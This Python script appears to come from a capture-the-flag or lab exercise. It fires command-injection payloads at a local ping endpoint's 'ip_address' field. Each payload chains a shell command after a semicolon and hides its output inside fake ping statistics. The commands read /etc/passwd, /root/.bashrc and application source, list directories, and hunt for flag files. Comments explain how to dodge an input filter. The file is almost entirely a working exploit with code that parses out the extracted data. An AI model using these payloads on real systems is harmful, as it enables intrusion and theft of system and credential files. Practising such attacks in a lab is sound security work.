import requests
import re

url = "http://127.0.0.1:33052/ping"

# Avoid: 2>/dev/null, *, wildcards, find, ls with options
# Use simple commands only
payloads = [
    # Test which patterns are blocked
    'invalid;echo "$(ls) packets transmitted, 1 received, 0% packet loss"',
    
    # Simple ls
    'invalid;echo "$(ls /) packets transmitted, 1 received, 0% packet loss"',
    
    # Simple cat without redirection
    'invalid;echo "$(cat /etc/hostname) packets transmitted, 1 received, 0% packet loss"',
    
    # Multiple cats
    'invalid;echo "$(cat /etc/passwd) packets transmitted, 1 received, 0% packet loss"',
    
    # Read specific files
    'invalid;echo "$(cat /root/.bashrc) packets transmitted, 1 received, 0% packet loss"',
    
    # Check whats in /app
    'invalid;echo "$(ls /app) packets transmitted, 1 received, 0% packet loss"',
    
    # Try to cat a file that might exist
    'invalid;echo "$(cat /app/server.py) packets transmitted, 1 received, 0% packet loss"',
    
    # Check home
    'invalid;echo "$(ls /root) packets transmitted, 1 received, 0% packet loss"',
    
    # Try reading from specific locations
    'invalid;echo "$(cat /var/www/html/index.html) packets transmitted, 1 received, 0% packet loss"',
    
    # Try with dir command
    'invalid;echo "$(dir /) packets transmitted, 1 received, 0% packet loss"',
    
    # Read requirements or other common files
    'invalid;echo "$(cat /app/requirements.txt) packets transmitted, 1 received, 0% packet loss"',
    
    # Try /home
    'invalid;echo "$(ls /home) packets transmitted, 1 received, 0% packet loss"',
    
    # Check if there's a txt file at root using test
    'invalid;test -f /test.txt && echo YES;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Try to list using echo with glob (if shell is bash)
    'invalid;echo /.* /{*,.*};echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Check for f*.txt using brace expansion trick
    'invalid;ls /{f,F}*.txt;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Try ls on / without any glob
    'invalid;echo "$(ls -1 /) packets transmitted, 1 received, 0% packet loss"',
    
    # Read file using dd
    'invalid;echo "$(dd if=/etc/hostname bs=1 count=20) packets transmitted, 1 received, 0% packet loss"',
    
    # Use sed to read file (1q = quit after first line)
    'invalid;echo "$(sed 1q /etc/passwd) packets transmitted, 1 received, 0% packet loss"',
    
    # Check what's in /tmp
    'invalid;echo "$(ls /tmp) packets transmitted, 1 received, 0% packet loss"',
    
    # Getting desperate - try common flag locations
    'invalid;cat /flag;echo "1 packets transmitted, 1 received, 0% packet loss"',
    'invalid;cat /FLAG;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Try reading with a trick - use head on file pattern
    'invalid;head /????.txt;echo "1 packets transmitted, 1 received, 0% packet loss"',
]

print("="*80)
print("Simple File Discovery (No Wildcards, No Redirections)")
print("="*80)

results = []

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {payload[:65]}...")
    print("-"*60)
    
    try:
        resp = requests.post(url, data={"ip_address": payload}, timeout=10)
        
        print(f"Status: {resp.status_code}")
        
        if "Invalid input" not in resp.text:
            match = re.search(r'Packets Transmitted: ([^,]+), Packets Received: ([^,]+), Packet Loss: ([^%]+)%', resp.text)
            if match:
                trans, recv, loss = match.groups()
                print(f"Transmitted: '{trans[:80]}{'...' if len(trans) > 80 else ''}'")
                if trans and len(trans) > 1 and not trans.isdigit():
                    print(f"[!] DATA: {trans}")
            else:
                # No match means parsing failed or other issue - show response
                print(f"Response: {resp.text[:200]}...")
        else:
            print("BLOCKED")
                
        results.append({
            'test': i,
            'payload': payload,
            'response': resp.text
        })
        
    except Exception as e:
        print(f"ERROR: {e}")

# Summary
print("\n" + "="*80)
print("DATA EXTRACTED")
print("="*80)

for r in results:
    resp = r['response']
    if "Invalid input" not in resp:
        match = re.search(r'Packets Transmitted: ([^,]+),', resp)
        if match:
            trans = match.group(1).strip()
            if trans and len(trans) > 1 and trans not in ['1', '2', 'ping: 1']:
                print(f"\n[TEST {r['test']}]")
                print(f"Data: {trans}")
                print(f"Payload: {r['payload'][:60]}...")

